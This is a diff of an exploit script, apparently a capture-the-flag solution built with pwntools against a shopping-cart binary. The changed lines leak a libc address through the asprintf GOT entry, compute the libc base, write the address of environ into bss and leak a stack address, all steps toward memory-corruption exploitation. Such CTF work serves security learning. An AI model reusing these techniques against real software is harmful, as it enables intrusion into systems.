@@ -83,18 +83,19 @@ def solve():
 
     checkout()
 
-    list_cart(p32(0x080462, big=True) + p32(0x1337) + p64(0))
-    io.recvuntil(b"27: ")
-    mem = io.recvline().split(b"$")[1]
-    leak = ctypes.c_uint32(int(mem)).value
-    libc.address = leak - 0x2d060
+    # leak libc
+    list_cart(p32(0x080462, big=True) + b"A"*3 + p32(exe.got["asprintf"]) + p32(0))
+    io.recvuntil(b"28: ")
+    leak = io.recvlines(2)[-1].split(b"$")[-1]
+    leak = ctypes.c_uint32(int(leak)).value
+    libc.address = leak - libc.sym["atoi"]
     info("libc base: %#x", libc.address)
 
     # write &environ to bss section
     bss = 0x0804b0a0
     remove_from_cart(28, p32(0x080462, big=True) + b"A"*3 + p32(libc.sym["environ"]) + p32(bss - 8))
 
-    # leak stack from bss => environ
+    # leak stack from environ
     list_cart(p32(0x080462, big=True) + b"A"*3 + p32(bss) + p32(0))
     io.recvuntil(b"29: ")
     leak = io.recvline()
